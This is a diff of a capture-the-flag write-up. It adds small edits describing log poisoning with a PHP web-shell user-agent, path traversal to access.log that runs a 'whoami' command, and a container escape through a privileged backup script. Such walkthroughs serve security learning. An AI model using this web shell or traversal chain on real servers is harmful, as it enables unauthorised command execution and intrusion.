@@ -38,7 +38,7 @@ After doing some research and manual checking of common files I came acrossed ac
 ```
 * Include the 'ext' so that it won't add the php extension to the end.
 
-The access.log included ip, time, request, and user-agent information. I sent a modified request where I made the user-agent = `<?php system($_GET['cmd']);?>` This way when we navigate to access.log we can pass in a parameter 'cmd' which will execute commands on the system.
+The access.log included ip, time, request, and user-agent information. I sent a modified request using Burp where I made the user-agent = `<?php system($_GET['cmd']);?>` This way when we navigate to access.log we can pass in a parameter 'cmd' which will execute commands on the system.
 
 ```?view=./dog/../../../../../../../var/log/apache2/access.log&ext&cmd=whoami```
 
@@ -82,7 +82,7 @@ A quick visit to [GTFOBins](https://gtfobins.github.io/gtfobins/env/) and we can
 
 ## Flag 4
 
-Honestly I had no idea how to get flag 4. You need to escape the docker container that you are in which was a new concept for me.
+Honestly I had no idea how to get flag 4. You need to escape the docker container that you are in which was a new concept for me. This docker container runs priviledged on the parent machine and has a backup bash script that runs frequently. You can use this to send a shell on the parent machine to yourself.
 
 Navigate to /opt/backups
 
